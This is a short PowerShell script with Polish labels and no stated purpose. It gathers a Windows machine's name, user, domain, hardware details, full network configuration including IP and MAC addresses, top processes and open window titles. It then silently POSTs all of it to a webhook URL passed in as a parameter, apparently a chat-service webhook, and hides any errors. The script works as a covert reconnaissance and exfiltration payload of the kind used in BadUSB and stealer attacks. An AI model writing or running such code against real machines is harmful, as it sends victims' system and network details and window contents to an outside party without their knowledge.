param([string]$webhook)

$compName = $env:COMPUTERNAME
$userName = $env:USERNAME

$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if (!$domain) { $domain = "BRAK" }

$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"

$cpu = (Get-WmiObject Win32_Processor).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)

$networkInfo = ""
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled}
foreach ($a in $adapters) {
    $name = (Get-WmiObject Win32_NetworkAdapter | Where-Object {$_.Index -eq $a.Index}).Name
    $ip = $a.IPAddress[0]
    $mask = $a.IPSubnet[0]
    $gw = $a.DefaultIPGateway -join " "
    $dns = $a.DNSServerSearchOrder -join " "
    $mac = $a.MACAddress
    $networkInfo += "Karta: $name`nIP: $ip`nMaska: $mask`nBrama: $gw`nDNS: $dns`nMAC: $mac`n---`n"
}
if (!$networkInfo) { $networkInfo = "Brak" }

$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | ForEach-Object {
    "$($_.ProcessName) CPU:$([math]::Round($_.CPU,1)) RAM:$([math]::Round($_.WorkingSet/1MB,1))MB"
}
$procsText = $procs -join "`n"
if (!$procsText) { $procsText = "Brak" }

$windows = @(Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object -First 5 -ExpandProperty MainWindowTitle)
$windowsText = $windows -join "`n"
if (!$windowsText) { $windowsText = "Brak" }

$message = @"
KOMPUTER: $compName
UZYTKOWNIK: $userName
DOMENA: $domain
UPTIME: $uptimeStr
CPU: $cpu
RAM: $ram GB

SIECI:
$networkInfo
PROCESY:
$procsText

OKNA:
$windowsText
"@

$body = @{ content = $message } | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
} catch {}
